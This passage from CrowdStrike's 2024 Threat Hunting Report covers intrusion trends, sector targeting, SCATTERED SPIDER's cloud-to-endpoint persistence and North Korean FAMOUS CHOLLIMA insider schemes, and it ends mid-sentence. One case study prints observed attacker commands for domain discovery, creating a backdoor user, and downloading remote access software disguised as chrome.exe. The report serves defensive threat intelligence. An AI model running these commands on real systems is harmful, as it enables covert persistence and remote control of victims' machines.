## Introduction
Stealth and speed were the dominant themes of the 2023 cyber threat landscape. Adversaries have faced a hardened attack surface due to advancements in threat defense technology and threat awareness. In response, they have increasingly adopted and relied on techniques that allow them to move faster and evade detection.

CrowdStrike's Counter Adversary Operations team brings together industry-leading threat intelligence and pioneering managed threat hunting with the AI-powered CrowdStrike Falcon® platform to detect, disrupt and stop today’s sophisticated adversaries. Their efforts safeguard thousands of customers from the most sophisticated adversaries by providing the intelligence, threat hunting skills and resources that most organizations lack.

As adversaries adopt new tactics, the CrowdStrike OverWatch team does the same. Cross-domain threat hunting has become essential as threat actors target multiple domains across an organization's infrastructure — most notably identity, endpoint and cloud — in their efforts to evade detection. These cross-domain threats pose a challenge to threat hunters because they often generate fewer detections in a single domain or product, making the activity difficult to recognize as malicious. Adversaries that gain access continue to operate under the radar using legitimate remote monitoring and management (RMM) tools. As they strive to shrink their footprint and refine their attacks, CrowdStrike OverWatch works tirelessly to detect them with cross-domain threat hunting.

> THE CROWDSTRIKE 2024 THREAT HUNTING REPORT HIGHLIGHTS THE TRENDS THE CROWDSTRIKE OVERWATCH TEAM HAS OBSERVED OVER THE PAST 12 MONTHS AND DETAILS HOW CROWDSTRIKE OVERWATCH UTILIZES PROACTIVE, INTELLIGENCE-INFORMED THREAT HUNTING TO RELENTLESSLY TRACK, DETECT AND ULTIMATELY DISRUPT THE ADVERSARY NO MATTER WHEN OR WHERE THEY OPERATE.

The cross-domain threat is increasing as adversaries attempt to infiltrate targets through human access, commonly known as “insider threats.” This year, CrowdStrike OverWatch identified individuals associated with the Democratic People’s Republic of Korea (DPRK)-nexus adversary FAMOUS CHOLLIMA applying to, or actively working at, more than 100 unique companies. This threat actor exploited the recruitment and onboarding processes to obtain physical access through legitimately provisioned systems, which were housed at intermediary locations. The adversary insiders remotely accessed these systems to log in to corporate VPNs posing as developers. This masquerade gave FAMOUS CHOLLIMA deeply enduring access to dozens of organizations and proved nearly impossible to detect without the benefit of CrowdStrike OverWatch threat hunting and the support of far-reaching visibility provided by the Falcon platform.

In addition to conducting cross-domain attacks, adversaries are developing greater expertise in moving seamlessly between platforms and using tools that are equally effective across operating systems. This rise in “hybrid threats” presents significant challenges to defenders across disciplines. DPRK-nexus adversaries, for example, quickly navigate multiple platforms, build custom tooling and spontaneously pivot actions on objectives — highlighting the need for fast, proactive and intelligence-driven hunting to stay one step ahead of the threat actors.

Identity-based detections are particularly important, as they can identify suspicious activity on unmanaged hosts and supplement traditional endpoint detection and response (EDR) events. Consistent with last year, threat actors increasingly use identity-based attacks to gain initial access. Using CrowdStrike Falcon® Identity Protection, CrowdStrike OverWatch threat hunters continued to expand their hunting mission and routinely countered persistent adversaries that employ identity attacks, including formidable threat actors like China-nexus HORDE PANDA.

Adversaries are also increasingly pivoting to cloud environments, with a noted 75% increase in 2023, as stated in the CrowdStrike 2024 Global Threat Report. While many threat actors employ basic techniques, others — such as prolific eCrime adversary SCATTERED SPIDER and Russia-nexus adversary COZY BEAR — evolve quickly, and proactive hunters must stay one step ahead in the cloud. CrowdStrike OverWatch keeps pace with these adversaries by developing innovative hunting techniques for cloud services, workloads and control planes as well as using advances in CrowdStrike's identity protection module.

While threat hunters faced many new challenges in the past 12 months, long-standing endpoint threats did not abate. Adversaries continued to leverage a seemingly endless list of RMM tools, which are appealing due to their wide availability and their use as legitimate solutions in many organizations. eCrime and targeted intrusion adversaries alike continue to rely on RMM tooling. Examples include eCrime adversary CHEF SPIDER and Iran-nexus adversary STATIC KITTEN, which both used phishing campaigns delivering RMM tools to create an effective initial access beachhead.

Speed, accuracy and threat intelligence are integral components to countering the adversary through proactive hunting. This year, in the MITRE Engenuity ATT&CK® Evaluations: Managed Services, Round 2, detection-only test, CrowdStrike delivered comprehensive detection coverage and rapid mean time to detect (MTTD) at an impressive four minutes.

Over the past 12 months, CrowdStrike OverWatch threat hunters distilled their findings into hundreds of new behavior-based preventions. As a result, the team’s front-line findings directly augment the Falcon platform’s ability to detect and prevent the latest threats. In the past year alone, these new behavior-based detections have enabled the Falcon platform to prevent an additional 2.4 million malicious events that would have otherwise evaded autonomous detection methods — amounting to approximately 4.6 preventions per minute.

The CrowdStrike 2024 Threat Hunting Report presents trends identified from July 1, 2023, to June 30, 2024, exposed by proactive, intelligence-informed threat hunting. Year-over-year, CrowdStrike OverWatch observed the following:

*   Interactive intrusions increased by 55%. An interactive intrusion occurs when threat actors perform hands-on-keyboard activities within a victim's environment.
*   86% of all interactive intrusions were attributed to eCrime activity.
*   eCrime-related interactive intrusions against the healthcare sector increased 75%.
*   Interactive intrusions impacting the technology sector increased 60%, making technology the most frequently targeted industry for the seventh consecutive year.
*   FAMOUS CHOLLIMA insiders were identified applying to or actively working at more than 100 unique companies.
*   Adversary use of RMM tools increased 70%, and 27% of all interactive intrusions leveraged RMM tools.

This report represents the Counter Adversary Operations team’s relentless efforts to disrupt the adversary. Behind every CrowdStrike threat hunter is the power of a unified security solution, empowering hunters with the richest security telemetry — encompassing endpoint, identity and cloud workloads as well as intelligence — to find and stop adversaries in their tracks.

## Front-Line Snapshot
The statistics provided in this report reflect insights from the CrowdStrike OverWatch threat hunting team from July 1, 2023, through June 30, 2024. This data specifically focuses on interactive intrusions — attacks where adversaries establish an active presence within a target network, often engaging in hands-on-keyboard activities to achieve their objectives. Unlike automated attacks, interactive intrusions involve human operators who interact with systems in real time, adapting their tactics as needed. Interactive intrusions are typically more sophisticated and difficult to detect compared to automated attacks, requiring advanced threat hunting and incident response capabilities to identify and mitigate.

Interactive intrusions are characterized by:

*   Manual Intervention: Attackers manually navigate the network, leveraging their skills and knowledge to bypass security controls.
*   Persistence: Attackers establish and maintain long-term access to the network, often using advanced techniques to evade detection.
*   Lateral Movement: After gaining initial access, attackers move laterally across the network to identify and compromise additional systems.
*   Data Exfiltration: The primary goal is often to steal sensitive data, intellectual property or credentials.
*   Customization: Attackers tailor their techniques to the specific environment and defenses of the target organization.

Over the past 12 months, CrowdStrike OverWatch observed interactive intrusions continue to climb, increasing 55% year-over-year. The overall distribution of interactive intrusion activity by threat type saw a noted increase in activity by eCrime adversaries — 86% of the total volume was associated with eCrime — highlighting the increased threat posed by criminal threat actors seeking financial gain. These observations underscore the persistent and pervasive threat of eCrime adversaries as well as CrowdStrike OverWatch’s ability to quickly identify and uncover them.

> INTERACTIVE INTRUSIONS ARE TYPICALLY MORE SOPHISTICATED AND DIFFICULT TO DETECT COMPARED TO AUTOMATED ATTACKS, REQUIRING ADVANCED THREAT HUNTING AND INCIDENT RESPONSE CAPABILITIES TO IDENTIFY AND MITIGATE.

## Sector Targeting
For the reporting period, interactive intrusions impacting technology entities increased 60% year-over-year, making technology the most frequently targeted industry for the seventh consecutive year. The technology sector encompasses a broad range of organizations that develop computer software and hardware or provide IT services or technology. Due to its relationship to many other verticals, the technology sector is a high-value target for both targeted intrusion and eCrime adversaries.

**Figure 2. Targeted sectors by intrusion frequency, July 2022-June 2023 vs. July 2023-June 2024**

*The following is a description of the contents of Figure 2.*

    *   **eCrime:** In the 2022-2023 period, the top sectors were technology, consulting and professional services, healthcare, financial services, retail, government, and manufacturing. In 2023-2024, the top sectors were technology, consulting and professional services, healthcare, financial services, retail, government, and manufacturing.

## Sector Spotlights

### Healthcare
While technology entities remain attractive targets for various adversaries, eCrime-related interactive intrusions against healthcare entities increased 75% over the prior 12 months. The healthcare sector includes a large variety of entities that possess patients’ protected health information (PHI), financial information (such as credit card and bank account numbers) and personally identifiable information (PII), making these entities a prime target for eCrime threat actors.

Big game hunting (BGH) adversaries — which remain the primary threat to all sectors, including healthcare — use data theft, extortion and ransomware to pressure victims into paying a ransom. Access brokers — threat actors that acquire access to organizations and provide or sell this access to other actors — and commodity services also continue to threaten the healthcare sector by facilitating the financially motivated operations of other eCrime threat actors. To evidence this threat, access broker advertisements for healthcare entities increased 142% compared to the previous 12 months.

### Consulting and Professional Services
Targeted intrusion activity targeting the consulting and professional services vertical increased by 141% year-over-year, moving this vertical up to second place in overall sector targeting trends and displacing both financial services and retail. The consulting and professional services sector provides specialist services and/or consultancy and is staffed by employees with specific skill sets or training. This sector includes human resources, architectural, recruitment agency, consultancy and marketing services. Consulting and professional services entities possess a significant amount of sensitive information — including financial and personal data, strategic plans and trade secrets — that makes these entities increasingly attractive for targeted intrusion adversaries.

Given the sector’s supporting nature, targeted intrusion adversaries can also target entities in this sector to gain access to additional downstream victims. The consulting and professional services sector is becoming a popular target for various eCrime adversaries, including BGH threat actors and access brokers, as entities within this sector present numerous opportunities for these threat actors to profit financially. To evidence this threat, access broker advertisements for consulting and professional services entities increased 152% year-over-year.

### MITRE ATT&CK Observations
CrowdStrike OverWatch tracks interactive intrusion activity against the MITRE ATT&CK® Enterprise Matrix, a framework that categorizes and tracks adversary behavior.<sup>1</sup>

This heat map illustrates the top MITRE techniques and tactics CrowdStrike OverWatch detected in interactive intrusion activity over the past 12 months. CrowdStrike OverWatch tirelessly hunts for post-exploitation behaviors — no matter the initial access vector, adversaries are detected very quickly. As a result, CrowdStrike OverWatch most often observes techniques within the Discovery tactic, when adversaries are still orienting themselves in a network.

**Figure 3. MITRE ATT&CK heat map highlighting top techniques CrowdStrike OverWatch observed adversaries employ in each tactic area, July 2023-June 2024**

*The following is a description of the contents of Figure 3.*

*   **MITRE ATT&CK Heat Map:** This is a heat map showing the top techniques observed by CrowdStrike OverWatch across various MITRE ATT&CK tactics. The tactics and techniques are as follows:
    *   **Initial Access:** Exploit Public-Facing Application, Valid Accounts, Exploitation for Client Execution
    *   **Execution:** Command and Scripting Interpreter, Windows Management Instrumentation, Shared Modules, Create Account
    *   **Persistence:** Scheduled Task/Job, Valid Accounts, Scheduled Task/Job
    *   **Privilege Escalation:** Process Injection, Abuse Elevation Control Mechanism, Abuse Elevation Control Mechanism
    *   **Defense Evasion:** Masquerading, Disable or Modify Tools, Modify Registry, Process Injection, Obfuscated Files or Information, Indicator Removal, Deobfuscate/Decode Files or Information
    *   **Credential Access:** OS Credential Dumping, Unsecured Credentials, Credentials In Files, Brute Force
    *   **Discovery:** Account Discovery, System Owner/User Discovery, System Network Configuration Discovery, Remote System Discovery, Permission Groups Discovery, Network Service Discovery, Security Software Discovery, Network Share Discovery, Domain Groups, File and Directory Discovery
    *   **Lateral Movement:** Remote Desktop Protocol, Remote Services, SMB/Windows Admin Shares, Valid Accounts
    *   **Collection:** Archive Collected Data, Remote Access Software
    *   **Command and Control:** Ingress Tool Transfer, Web Service, Application Layer Protocol, Proxy
    *   **Exfiltration:** Data Encrypted for Impact
    *   **Impact:** Inhibit System Recovery

Use of MITRE ATT&CK techniques involving identity increased across all stages of adversary operations. Discovery techniques remain the most prominent category — half of the top 10 techniques observed in the past 12 months fall into this category. This is unsurprising, as eCrime access brokers rely on these techniques — including Account Discovery, System Network Configuration Discovery and Remote System Discovery — to evaluate targets as part of the threat actors’ efforts to monetize operations. OS Credential Dumping and Account Discovery are often interconnected, as adversaries continue to compromise valid identities to access networks.

Adversaries are increasingly leveraging RMM tools, and Ingress Tool Transfer and Masquerading remained two of the top MITRE tactics. As organizations become increasingly aware of RMM threats, adversaries such as STATIC KITTEN have begun to rename these tools to obfuscate their efforts.

Unsurprisingly, Disabling and Modifying Tools to Impair Defenses was a commonly observed technique. As EDR and extended detection and response (XDR) platforms such as the Falcon platform grow more sophisticated, adversary attacks are more frequently disrupted. Over the past 12 months, many adversaries have advertised custom tooling that allegedly uncovers EDR products. Though these tools are often ineffective, adversaries are increasingly interested in them. As this threat evolves and adversaries attempt to circumvent security controls, human-driven threat hunting teams such as CrowdStrike OverWatch are a vital line of defense.

## Intrusion Trends by Adversary
CrowdStrike is a pioneer in adversary profiling and attribution. With detailed information into 245+ attributed eCrime, targeted intrusion and hacktivist adversaries — and more than 140 active clusters of malicious activity that have not yet met CrowdStrike’s standards for adversary graduation — CrowdStrike OverWatch threat hunters are well positioned to quickly and accurately disrupt the adversary. The following image highlights the most prevalent adversary operations identified over the past 12 months.

**Figure 4. Interactive adversary disruptions across the world, July 2023-June 2024**

*The following is a description of the contents of Figure 4.*

*   **World Map:** This is a world map showing the geographic distribution of interactive adversary disruptions. The map is divided into regions, each with a list of adversaries and the sectors they targeted.

eCrime adversaries are the most prevalent type of threat actors that CrowdStrike OverWatch threat hunters disrupt; these adversaries are prolific and often opportunistic. In many instances, CrowdStrike OverWatch detects targeted intrusion adversary activity early in the kill chain before it reaches an interactive stage. For example:

*   The Falcon sensor prevented PRIMITIVE BEAR’s initial access attempts, which involved spear-phishing and a weaponized USB, before the adversary could gain interactive access. CrowdStrike OverWatch’s specific insights were turned into sensor-level detections.
*   China-nexus adversaries are increasingly attempting access via stealthy implants and .NET execution through compromised Internet Information Services (IIS) servers. In response, CrowdStrike OverWatch threat hunters worked with CrowdStrike’s engineering teams to ensure that this entry point has increased visibility. By honing hunting leads that focus on reflective .NET loading and IIS compromise, CrowdStrike OverWatch prevented China-nexus adversaries from achieving initial access or from moving laterally in a network.

Over the last 12 months, CrowdStrike OverWatch continued to observe adversaries leverage speed and stealth across the landscape to minimize their footprints and increase their chances of evading automated detections. As defenses harden, adversaries evolve their tactics to hide within normal network activity.

The good news is that CrowdStrike OverWatch hunters work 24/7, 365 days a year to stop them. Human expertise and threat hunting are crucial for distinguishing between real threats and normal activity without generating false positives that distract security teams. CrowdStrike’s elite threat hunters rapidly identify stealthy attacks and adversary tactics, feeding these new detections into the AI-powered Falcon platform. This virtuous cycle enhances the Falcon platform and strengthens defenses for all CrowdStrike customers.

## Observations from the Front Lines

### Hunting the Cross-Domain Threat
Cross-domain threat hunting refers to CrowdStrike OverWatch’s ability to identify adversary behavior even when it takes place across several domains of an organization's security structure, notably identity, endpoint and cloud. Attacks that take place across multiple domains pose a significant challenge because they often generate fewer detections in any single domain or product. This dispersed footprint makes intrusion activity difficult to successfully recognize as being malicious, as it can appear to take place in isolation or without correlating detections.

By combining data and detections from multiple domains and leveraging that against CrowdStrike’s threat intelligence, CrowdStrike OverWatch is uniquely situated to respond to threats that cross these domain barriers.

Cross-domain intrusions can vary significantly in complexity, but CrowdStrike commonly sees adversaries moving either back and forth between the endpoint and identity planes or from the cloud to an endpoint.

The latter is a particularly dangerous and increasingly prevalent occurrence that is enabled by improvements in phishing and the spread of infostealers.

If adversaries can find or steal credentials, they can gain direct access to poorly configured cloud environments, bypassing the need to compromise heavily defended endpoints. From this vantage point, they are then able to find over-privileged users and roles to further compromise cloud environments or use their access to descend into endpoint environments. With this access, they can deploy remote management tools instead of malware, making these attacks challenging to disrupt.

One of the most proficient and prolific adversaries capable of cross-domain attacks is SCATTERED SPIDER. Throughout 2023 and 2024, SCATTERED SPIDER demonstrated sophisticated cross-domain tradecraft within targeted cloud environments, often leveraging spear-phishing, policy modification and access to password managers to gain access, maintain persistence, move laterally and exfiltrate data.

### Case Study: SCATTERED SPIDER Abuses Cloud Management Agent to Establish Persistence
In May 2024, CrowdStrike OverWatch observed SCATTERED SPIDER establish a foothold on a cloud-hosted virtual machine (VM) instance via a cloud service VM management agent. To do so, the adversary compromised existing credentials to authenticate to the cloud control plane via an identified phishing campaign. After authenticating to the cloud console, the adversary established persistence by executing commands on the cloud-hosted VM via the management agent.

After establishing an initial connection, SCATTERED SPIDER executed the `ping` command against several domains within and outside of the target organization, likely to identify their level of access and visibility within the network. The adversary then ran several variations of the `nltest` command to identify domain controllers (DCs) of interest and the `wmic` command to identify programs currently installed on the host.

Finally, the adversary established persistence by creating a new user on the host and attempting to download FleetDeck remote access software.

```
nltest /dclist:<domain>
nltest /domain_trusts
wmic product get name, version
net user [Redacted-Username] [Redacted-Password]
curl -L hxxps://agent.fleetdeck[.]io/
M9zydGyGHrUXkhZeB9mj4?win -o chrome.exe
```

This attack took place across three operating domains: email, then cloud management, then within a VM. Because of this, the detectable footprint of this activity in any single detection domain was very low and difficult to conclusively signature. Quickly identifying such an attack relied on leveraging knowledge about SCATTERED SPIDER from CrowdStrike’s extensive threat intelligence and prior experience, combining this knowledge with telemetry from the control plane and correlating this information against detections from within the virtual machine to successfully recognize an intrusion underway.

Many adversaries are honing their cross-domain proficiency, and an increasing number are attempting to develop capabilities that expand to multiple security domains. Such adversaries can quickly and confidently navigate multiple operating systems and security platforms. Whether the adversary is leveraging native applications or cross-platform custom tools, threat hunters must be flexible and quickly adapt to any target environment.

    *   **IDENTITY:** Conducted a phishing campaign to obtain valid credentials.
    *   **CLOUD:** Leveraged the credentials to authenticate to the cloud control plane.
    *   **CLOUD:** Established a foothold on a cloud-hosted VM via a cloud service VM management agent, which took commands from the cloud control plane and ran them on the instance under the agent process.
    *   **ENDPOINT:** Established persistence by creating a new user and downloading FleetDeck.

### Hunting the Insider Threat
CrowdStrike OverWatch hunters are continually faced with new challenges as adversaries increasingly seek stealthy and creative avenues for initial access. In addition to leveraging cross-domain attacks, adversaries are becoming more platform-agnostic, moving seamlessly between platforms with tooling and capabilities that are equally effective for Windows, macOS and Linux. In some cases, the adversary’s motivations have become cross-mission, blending traditional espionage goals with opportunistic currency generation. No adversaries exemplify this hybrid threat better than DPRK-nexus adversaries.

Hunting hybrid threats can present a significant challenge, given the ease and speed with which these adversaries adjust their tactics, tools, targets and — in some cases — primary goals. Countering these adversaries requires constant awareness of their behavioral and operational shifts, an area where intelligence-driven hunting becomes a necessity.

Though DPRK adversaries in general exemplify the hybrid threat, the adversary FAMOUS CHOLLIMA presented a unique challenge to CrowdStrike OverWatch hunters over the past year: hunting the adversary when they become the insider threat.

FAMOUS CHOLLIMA operations are similar to other DPRK-nexus adversaries in that this adversary will leverage recruitment-themed lures, abuse malicious NPM and Node.js packages, deploy custom tooling known as BeaverTail and InvisibleFerret, and focus heavily on financial and technology entities. One key differentiator is that this adversary has also been involved in insider threat operations involving a network of malicious insiders who infiltrate corporate environments under the guise of legitimate employment.

FAMOUS CHOLLIMA carried out these operations by obtaining contract or full-time equivalent employment, using falsified or stolen identity documents to bypass background checks. When applying for a job, these malicious insiders submitted a résumé typically listing previous employment with a prominent company as well as additional lesser-known companies and no employment gaps. In most cases, these insiders appeared financially motivated — however, in a limited number of incidents, the threat actors exfiltrated sensitive information.

**Figure 6. Hunting FAMOUS CHOLLIMA insider threat operations**

*The following is a description of the contents of Figure 6.*

*   **Hunting FAMOUS CHOLLIMA Insider Threat Operations:** This is a diagram illustrating the steps and strategies used to hunt FAMOUS CHOLLIMA insider threats.
    *   **Looking for Network Communications:** Hunting for abnormal source IP ranges.
    *   **Hunting for RMM:** Looking for specific RMM tools such as RustDesk, AnyDesk, TinyPilot, VS Code Dev Tunnels, and Google Chrome Remote Desktop.
    *   **Validating with CrowdStrike Falcon Identity Protection:** Comparing and validating expected behaviors for a known role with non-expected behaviors.
    *   **Disrupting the Adversary:** Validating and alerting suspicious activity with victims.
    *   **Strengthening Detections:** Creating new detections and preventions for the Falcon platform.

### Case Study: FAMOUS CHOLLIMA Insider Threats Target 100+ U.S.-Based Companies
In April 2024, CrowdStrike Services responded to the first of several incidents in which FAMOUS CHOLLIMA malicious insiders targeted more than 30 U.S.-based companies, including aerospace, defense, retail and technology organizations. The malicious insiders claimed to be U.S. residents and were hired in early 2023 for multiple remote IT positions.

Leveraging information from a single incident, CrowdStrike OverWatch quickly developed a scalable plan to hunt for this emerging insider threat and discovered more than 30 additional affected customers within two days. Threat hunters found that after obtaining employee-level access to victim networks, the insiders performed minimal tasks related to their job role. In some cases, the insiders also attempted to exfiltrate data using Git, SharePoint and OneDrive. Additionally, the insiders installed the following RMM tools: RustDesk, AnyDesk, TinyPilot, VS Code Dev Tunnels and Google Chrome Remote Desktop.

The insiders then leveraged these RMM tools in tandem with company network credentials, which allowed numerous IP addresses to connect to the victim’s system.

CrowdStrike OverWatch hunters searched for RMM tooling paired with suspicious network connections to systems. Combining these instances with information from the CrowdStrike Falcon Identity Protection module uncovered additional data, which allowed threat hunters to identify additional personas. CrowdStrike OverWatch leveraged Falcon Identity Protection to closely compare unexpected behaviors with expected behaviors for a known role within a company or network. Falcon Identity Protection provided context and data to enable hunters to identify suspicious actions.

CrowdStrike’s intelligence reporting enabled threat hunters to quickly identify additional indicators of compromise (IOCs), personas and techniques as well as uncover additional victim companies. CrowdStrike OverWatch then contacted likely victimized companies to inform them about potential insider threats and quickly corroborated CrowdStrike’s findings with the victim companies. By leveraging the findings from these companies, CrowdStrike Counter Adversary Operations built a cohesive picture from disparate pieces and coordinated with law enforcement entities.

As the Counter Adversary Operations team and CrowdStrike Services continued to investigate victimized companies — and as insights into FAMOUS CHOLLIMA’s operations grew — CrowdStrike OverWatch developed more than 20 hunting leads by combining EDR and identity data to identify malicious activity or suspect behavior.

In some cases, threat hunters identified suspicious activity that overlapped with a larger investigation into an operation that industry sources refer to as “DPRK IT Workers,” and CrowdStrike OverWatch notified these victim organizations within days of the insiders obtaining employment and subsequently gaining access to the organizations' networks.

Over the course of this investigation, CrowdStrike identified FAMOUS CHOLLIMA insiders applying to or actively working at more than 100 unique companies, most of which were U.S.-based technology entities.

In mid-2024, the U.S. Department of Justice (DOJ) indicted several individuals who allegedly participated in this scheme, which — according to the indictment — likely enabled North Korean nationals to raise money for the DPRK government and its weapons programs.<sup>2</sup>

<sup>2</sup> U.S. Department of Justice, “Charges and Seizures Brought in Fraud Scheme, Aimed at Denying Revenue for Workers Associated with North Korea,” May 16, 2024: www.justice.gov/opa/pr/charges-and-seizures-brought-fraud-scheme-aimed-denying-revenue-workers-associated-north; Federal Bureau of Investigation (FBI), “Democratic People's Republic of Korea Leverages U.S.-Based Individuals to Defraud U.S. Businesses and Generate Revenue,” May 16, 2024: https://www.ic3.gov/Media/Y2024/PSA240516

The FAMOUS CHOLLIMA case exemplifies the speed and ingenuity of CrowdStrike OverWatch hunters when faced with a new challenge. Following proven methodologies, threat hunters quickly and effectively responded to an emerging threat and uncovered key insights that were quickly shared with CrowdStrike Counter Adversary Operations, CrowdStrike Falcon® Identity Protection, CrowdStrike Services and CrowdStrike Falcon® Complete — creating a unified solution to a hybrid threat.

### Identity Hunting
Adversaries continue to maximize the use of stolen identities and attempt to minimize defenders’ network visibility by “living off the land” and therefore reducing potential indicators or alerts on the endpoint, which the adversary knows is heavily scrutinized. This tactic hinders threat hunters’ ability to differentiate adversary activity from typical user and system administrator activity.

#### Living Off the Land
> "Living off the land" refers to a strategy used by attackers to avoid detection by using legitimate tools and processes already present on a victim's system rather than introducing their own malicious software. This tactic leverages built-in system utilities and trusted applications to carry out malicious activities, making it more difficult for traditional security measures to identify and block the attack. By blending in with normal operations, attackers can maintain a low profile and extend their presence within a network without raising immediate alarms.

To achieve their objectives, adversaries must often use valid accounts and user identities in novel ways. For example, an adversary may need to elevate privileges or interact with previously uncontacted hosts, leaving behavior patterns that threat hunters can easily detect.

The Falcon Identity Protection module does not rely on endpoint telemetry and instead collects all communication made to enabled DCs, so the CrowdStrike OverWatch team often identifies compromises before the adversary pivots internally. For example, when an adversary is detected obtaining a foothold on an unmanaged internet-facing host (such as a network appliance), the early warning gives defenders more time to identify and contain attackers before they cause material damage. This reduces overall remediation efforts and prevents wide-scale compromise of the victim environment.

CrowdStrike OverWatch uses additional Falcon Identity Protection telemetry — including auditing logs — to identify the following TTPs after a threat actor authenticates on a
